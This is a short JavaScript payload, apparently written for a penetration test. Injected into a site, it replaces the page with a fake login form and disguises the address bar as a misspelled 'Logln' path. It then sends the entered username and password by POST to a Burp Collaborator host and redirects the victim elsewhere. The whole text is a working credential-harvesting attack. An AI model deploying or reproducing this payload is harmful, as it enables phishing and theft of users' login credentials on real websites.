
history.replaceState(null,null,"../../../Account/Logln");

document.body.innerHTML="
<!doctype html>
<html lang=\"en\">
    <head>
        <title>Pentest</title>
    </head>
    <body>
	</br></br></br></br></br><h1>Please login to continue</h1>
        <form>
            Username: <input id='user' type='text'>Password: <input id='pass' type='password'>
            <button type='button' onclick='getInputValue();'> Get Value </button>
 		<script>
        		   function getInputValue(){
           		 var inputUser = document.getElementById(\"user\").value;
				       var inputPass = document.getElementById(\"pass\").value;
            	 xhr = new XMLHttpRequest();
				       xhr.open(\"POST\",\"https://dp6j8t4r9vnlrk41l6ig8apa218uwj.burpcollaborator.net\",true);
				       xhr.send(\"user=\" + inputUser + \"&pass=\" + inputPass);
				       document.location=\"https://web.kate.center\";
        					}
    		</script>
        </form>
    </body>
</html>";
